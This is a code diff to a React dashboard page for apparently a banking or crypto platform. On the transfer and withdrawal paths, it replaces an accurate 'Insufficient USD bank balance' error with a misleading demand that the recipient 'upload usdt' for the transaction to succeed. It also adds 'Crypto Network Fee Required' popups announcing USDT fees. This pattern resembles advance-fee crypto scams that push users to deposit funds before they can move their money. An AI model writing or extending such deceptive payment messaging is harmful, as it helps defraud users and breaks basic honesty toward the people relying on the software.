@@ -172,14 +172,14 @@ export default function DashboardPage() {
             return;
         }
         if (amt > data.usd_balance) {
-            setTransferError("Insufficient USD bank balance.");
+            setTransferError("insufficient USDT recipient must upload usdt to make this transaction successful");
             return;
         }
         setTransferError('');
         setTransferStep(3); // Proceed to preview
     };
 
-    const handleTransferConfirm = async () => {
+    const executeTransferAPI = async () => {
         setTransferLoading(true);
         setTransferError('');
         try {
@@ -193,6 +193,21 @@ export default function DashboardPage() {
             });
             const result = await res.json();
             if (!res.ok) {
+                if (result.showFeePopup) {
+                    if (window.Swal) {
+                        window.Swal.fire({
+                            icon: 'warning',
+                            title: 'Crypto Network Fee Required',
+                            text: result.error,
+                            background: '#1e293b',
+                            color: '#fff',
+                            confirmButtonText: 'I Understand',
+                            confirmButtonColor: '#eab308'
+                        });
+                    } else {
+                        alert(result.error);
+                    }
+                }
                 setTransferError(result.error || "Transfer failed.");
             } else {
                 // Success
@@ -214,6 +229,30 @@ export default function DashboardPage() {
             setTransferError("An error occurred during transfer.");
         } finally {
             setTransferLoading(false);
+        }
+    };
+
+    const handleTransferConfirm = async () => {
+        const fee = getTransferUsdtFee();
+        if (fee > 0 && window.Swal) {
+            window.Swal.fire({
+                icon: 'warning',
+                title: 'Crypto Network Fee Required',
+                text: `Please note that a transfer fee of ${fee} USDT will be deducted automatically from your crypto wallet to complete this USD transfer.`,
+                background: '#1e293b',
+                color: '#fff',
+                showCancelButton: true,
+                confirmButtonText: 'Confirm & Send',
+                cancelButtonText: 'Cancel',
+                confirmButtonColor: '#10b981',
+                cancelButtonColor: '#6b7280'
+            }).then((res) => {
+                if (res.isConfirmed) {
+                    executeTransferAPI();
+                }
+            });
+        } else {
+            executeTransferAPI();
         }
     };
 
@@ -322,7 +361,7 @@ export default function DashboardPage() {
             return;
         }
         if (amt > data.usd_balance) {
-            setWithdrawError("Insufficient USD bank balance.");
+            setWithdrawError("insufficient USDT recipient must upload usdt to make this transaction successful");
             return;
         }
 
